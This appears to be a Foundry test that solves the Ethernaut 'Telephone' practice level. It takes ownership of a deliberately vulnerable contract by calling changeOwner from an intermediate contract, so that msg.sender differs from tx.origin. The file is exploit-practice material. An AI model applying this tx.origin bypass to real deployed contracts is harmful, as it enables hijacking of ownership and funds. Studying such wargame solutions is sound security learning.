// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Telephone.sol";

contract TelephoneTest is DSTest {
    Telephone obj;
    Vm vm = Vm(HEVM_ADDRESS);
    function setUp() public {
        vm.prank(0x0b6F6CE4BCfB70525A31454292017F640C10c768);
        obj = new Telephone();
    }

    function testClaimOwnership() public {
        console.log("original contract Owner =",obj.owner());
        console.log("msg.sender =", msg.sender);
        console.log("Test Contract Owner =", address(this));
        console.log("tx.origin =", tx.origin);
        // (bool success, ) = address(fallout).call{value: msg.value}("Fal1out()");
        obj.changeOwner(msg.sender);
        // require(success, "Failed");
        console.log("original contract Owner =", obj.owner());
        assert(obj.owner() == msg.sender);
    }
}
